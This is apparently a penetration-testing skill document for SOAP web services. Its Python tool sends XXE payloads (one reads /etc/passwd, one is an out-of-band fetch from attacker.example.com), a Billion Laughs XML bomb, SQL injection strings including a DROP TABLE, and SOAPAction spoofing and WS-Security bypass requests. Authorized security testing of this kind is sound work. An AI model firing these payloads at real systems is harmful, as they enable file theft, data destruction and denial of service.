---
name: performing-soap-web-service-security-testing
description: Perform security testing of SOAP web services by analyzing WSDL definitions and testing for XML injection, XXE, WS-Security bypass, and SOAPAction spoofing.
domain: cybersecurity
subdomain: api-security
tags: [soap, web-services, wsdl, xml-injection, xxe, ws-security, penetration-testing, soapaction-spoofing, xpath-injection]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Performing SOAP Web Service Security Testing

## Overview

SOAP (Simple Object Access Protocol) web services remain widely deployed in enterprise environments, financial systems, healthcare, and government integrations. Security testing of SOAP services involves analyzing WSDL (Web Services Description Language) definitions to understand available methods, testing for XML-based injection attacks (XXE, XPath injection, XML bombs), evaluating WS-Security implementation correctness, SOAPAction header spoofing, and assessing authentication and authorization controls. Unlike REST APIs, SOAP services use XML envelopes and often implement complex security standards that can be misconfigured.

## Prerequisites

- Target SOAP web service endpoint URL
- WSDL file or URL access for the service
- SoapUI or ReadyAPI for structured testing
- Burp Suite with SOAP extensions for interception
- Python 3.8+ with zeep and lxml libraries
- Authorization to perform security testing

## Testing Methodology

### Phase 1: WSDL Reconnaissance

```python
#!/usr/bin/env python3
"""SOAP Web Service Security Testing Tool

Analyzes WSDL definitions and tests SOAP endpoints for
common vulnerabilities including XXE, injection, and
WS-Security misconfigurations.
"""

import requests
import xml.etree.ElementTree as ET
from lxml import etree
import sys
import re
from typing import List, Dict, Optional
from dataclasses import dataclass

@dataclass
class SOAPOperation:
    name: str
    action: str
    input_message: str
    output_message: str
    parameters: List[Dict]

class SOAPSecurityTester:
    NAMESPACES = {
        'wsdl': 'http://schemas.xmlsoap.org/wsdl/',
        'soap': 'http://schemas.xmlsoap.org/wsdl/soap/',
        'soap12': 'http://schemas.xmlsoap.org/wsdl/soap12/',
        'xsd': 'http://www.w3.org/2001/XMLSchema',
        'wsse': 'http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd',
    }

    def __init__(self, wsdl_url: str, endpoint_url: Optional[str] = None):
        self.wsdl_url = wsdl_url
        self.endpoint_url = endpoint_url
        self.operations: List[SOAPOperation] = []
        self.findings: List[dict] = []

    def parse_wsdl(self) -> List[SOAPOperation]:
        """Parse WSDL to extract available operations and parameters."""
        response = requests.get(self.wsdl_url, timeout=30)
        root = etree.fromstring(response.content)

        # Extract endpoint URL if not provided
        if not self.endpoint_url:
            address = root.find('.//soap:address', self.NAMESPACES)
            if address is not None:
                self.endpoint_url = address.get('location')

        # Extract operations
        for binding_op in root.findall('.//wsdl:binding/wsdl:operation', self.NAMESPACES):
            name = binding_op.get('name')
            soap_op = binding_op.find('soap:operation', self.NAMESPACES)
            action = soap_op.get('soapAction', '') if soap_op is not None else ''

            operation = SOAPOperation(
                name=name,
                action=action,
                input_message="",
                output_message="",
                parameters=[]
            )
            self.operations.append(operation)

        print(f"[+] Found {len(self.operations)} SOAP operations")
        for op in self.operations:
            print(f"    - {op.name} (SOAPAction: {op.action})")

        return self.operations

    def test_xxe_vulnerability(self, operation: SOAPOperation) -> dict:
        """Test for XML External Entity (XXE) injection."""
        xxe_payloads = [
            # Classic XXE - File read
            {
                "name": "Classic XXE (file read)",
                "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <{operation}>&xxe;</{operation}>
  </soapenv:Body>
</soapenv:Envelope>'''.format(operation=operation.name)
            },
            # Blind XXE - Out-of-band
            {
                "name": "Blind XXE (OOB)",
                "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.example.com/xxe.dtd">
  %xxe;
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <{operation}>test</{operation}>
  </soapenv:Body>
</soapenv:Envelope>'''.format(operation=operation.name)
            },
            # XML Bomb (Billion Laughs)
            {
                "name": "XML Bomb (Billion Laughs)",
                "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <{operation}>&lol4;</{operation}>
  </soapenv:Body>
</soapenv:Envelope>'''.format(operation=operation.name)
            }
        ]

        results = []
        for xxe in xxe_payloads:
            try:
                response = requests.post(
                    self.endpoint_url,
                    data=xxe["payload"],
                    headers={
                        "Content-Type": "text/xml; charset=utf-8",
                        "SOAPAction": operation.action,
                    },
                    timeout=10
                )

                vulnerable = False
                indicators = []

                if "root:" in response.text or "/bin/" in response.text:
                    vulnerable = True
                    indicators.append("File contents in response")

                if response.status_code == 200 and "Fault" not in response.text:
                    indicators.append("No XML parsing error returned")

                if response.elapsed.total_seconds() > 5:
                    indicators.append("Slow response (possible XML bomb)")
                    vulnerable = True

                result = {
                    "test": xxe["name"],
                    "vulnerable": vulnerable,
                    "status_code": response.status_code,
                    "response_time": response.elapsed.total_seconds(),
                    "indicators": indicators
                }
                results.append(result)

                if vulnerable:
                    self.findings.append({
                        "severity": "CRITICAL",
                        "type": "XXE",
                        "operation": operation.name,
                        "details": xxe["name"]
                    })

            except requests.exceptions.Timeout:
                results.append({
                    "test": xxe["name"],
                    "vulnerable": True,
                    "indicators": ["Request timed out - possible DoS via XML bomb"]
                })

        return {"operation": operation.name, "xxe_results": results}

    def test_sql_injection(self, operation: SOAPOperation) -> dict:
        """Test SOAP parameters for SQL injection."""
        sqli_payloads = [
            "' OR '1'='1",
            "1; DROP TABLE users--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "' OR 1=1; WAITFOR DELAY '0:0:5'--",
            "admin'/*",
        ]

        results = []
        for payload in sqli_payloads:
            soap_body = f'''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <{operation.name}>
      <param>{payload}</param>
    </{operation.name}>
  </soapenv:Body>
</soapenv:Envelope>'''

            try:
                response = requests.post(
                    self.endpoint_url,
                    data=soap_body,
                    headers={
                        "Content-Type": "text/xml; charset=utf-8",
                        "SOAPAction": operation.action,
                    },
                    timeout=15
                )

                sql_errors = [
                    "SQL syntax", "ORA-", "mysql_", "SQLSTATE",
                    "Microsoft OLE DB", "Unclosed quotation mark",
                    "syntax error", "PostgreSQL"
                ]
                error_found = any(err in response.text for err in sql_errors)

                if error_found:
                    self.findings.append({
                        "severity": "CRITICAL",
                        "type": "SQL Injection",
                        "operation": operation.name,
                        "details": f"SQL error triggered with: {payload[:30]}..."
                    })

                results.append({
                    "payload": payload,
                    "status_code": response.status_code,
                    "sql_error_detected": error_found,
                    "response_time": response.elapsed.total_seconds()
                })

            except requests.exceptions.RequestException:
                continue

        return {"operation": operation.name, "sqli_results": results}

    def test_soapaction_spoofing(self) -> dict:
        """Test for SOAPAction header spoofing vulnerability."""
        results = []

        for i, operation in enumerate(self.operations):
            for j, other_op in enumerate(self.operations):
                if i == j:
                    continue

                # Send request with mismatched SOAPAction
                soap_body = f'''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <{operation.name}>
      <param>test</param>
    </{operation.name}>
  </soapenv:Body>
</soapenv:Envelope>'''

                try:
                    response = requests.post(
                        self.endpoint_url,
                        data=soap_body,
                        headers={
                            "Content-Type": "text/xml; charset=utf-8",
                            "SOAPAction": other_op.action,  # Wrong action
                        },
                        timeout=10
                    )

                    if response.status_code == 200 and "Fault" not in response.text:
                        self.findings.append({
                            "severity": "HIGH",
                            "type": "SOAPAction Spoofing",
                            "operation": operation.name,
                            "details": f"Accepted with SOAPAction of {other_op.name}"
                        })
                        results.append({
                            "body_operation": operation.name,
                            "spoofed_action": other_op.action,
                            "accepted": True
                        })

                except requests.exceptions.RequestException:
                    continue

        return {"spoofing_results": results}

    def test_ws_security_bypass(self) -> dict:
        """Test WS-Security token handling."""
        test_cases = [
            {
                "name": "Missing WS-Security header",
                "header": ""
            },
            {
                "name": "Empty security token",
                "header": '''<wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
    <wsse:UsernameToken>
      <wsse:Username></wsse:Username>
      <wsse:Password></wsse:Password>
    </wsse:UsernameToken>
  </wsse:Security>'''
            },
            {
                "name": "Expired timestamp",
                "header": '''<wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"
    xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
    <wsu:Timestamp>
      <wsu:Created>2020-01-01T00:00:00Z</wsu:Created>
      <wsu:Expires>2020-01-01T00:05:00Z</wsu:Expires>
    </wsu:Timestamp>
  </wsse:Security>'''
            }
        ]

        results = []
        for test in test_cases:
            if self.operations:
                operation = self.operations[0]
                soap_body = f'''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    {test["header"]}
  </soapenv:Header>
  <soapenv:Body>
    <{operation.name}><param>test</param></{operation.name}>
  </soapenv:Body>
</soapenv:Envelope>'''

                try:
                    response = requests.post(
                        self.endpoint_url,
                        data=soap_body,
                        headers={"Content-Type": "text/xml; charset=utf-8"},
                        timeout=10
                    )

                    accepted = response.status_code == 200 and "Fault" not in response.text
                    if accepted:
                        self.findings.append({
                            "severity": "CRITICAL",
                            "type": "WS-Security Bypass",
                            "operation": operation.name,
                            "details": test["name"]
                        })

                    results.append({
                        "test": test["name"],
                        "accepted": accepted,
                        "status_code": response.status_code
                    })
                except requests.exceptions.RequestException:
                    continue

        return {"ws_security_results": results}

    def generate_report(self) -> dict:
        """Generate comprehensive security assessment report."""
        return {
            "target": self.endpoint_url,
            "wsdl": self.wsdl_url,
            "operations_tested": len(self.operations),
            "total_findings": len(self.findings),
            "critical": len([f for f in self.findings if f["severity"] == "CRITICAL"]),
            "high": len([f for f in self.findings if f["severity"] == "HIGH"]),
            "findings": self.findings
        }


def main():
    wsdl_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080/ws?wsdl"
    tester = SOAPSecurityTester(wsdl_url)

    print(f"[*] Parsing WSDL: {wsdl_url}")
    operations = tester.parse_wsdl()

    for op in operations:
        print(f"\n[*] Testing operation: {op.name}")
        tester.test_xxe_vulnerability(op)
        tester.test_sql_injection(op)

    tester.test_soapaction_spoofing()
    tester.test_ws_security_bypass()

    report = tester.generate_report()
    print(f"\n{'='*60}")
    print(f"SOAP Security Assessment Report")
    print(f"{'='*60}")
    print(f"Target: {report['target']}")
    print(f"Operations Tested: {report['operations_tested']}")
    print(f"Findings: {report['total_findings']} "
          f"(Critical: {report['critical']}, High: {report['high']})")

    for finding in report['findings']:
        print(f"\n  [{finding['severity']}] {finding['type']}")
        print(f"  Operation: {finding['operation']}")
        print(f"  Details: {finding['details']}")


if __name__ == "__main__":
    main()
```

## References

- SecureLayer7 OWASP SOAP Pentesting: https://blog.securelayer7.net/owasp-top-10-pentesting-mitigating-soap-service-risks/
- BrightSec SOAP Vulnerabilities: https://brightsec.com/blog/top-7-soap-api-vulnerabilities/
- Levo.ai SOAP API Security Testing Guide: https://www.levo.ai/resources/blogs/soap-api-security-testing
- SoapUI Web Service Hacking: https://www.soapui.org/docs/soap-and-wsdl/tips-and-tricks/web-service-hacking/
- PortSwigger XXE Tutorial: https://portswigger.net/web-security/xxe
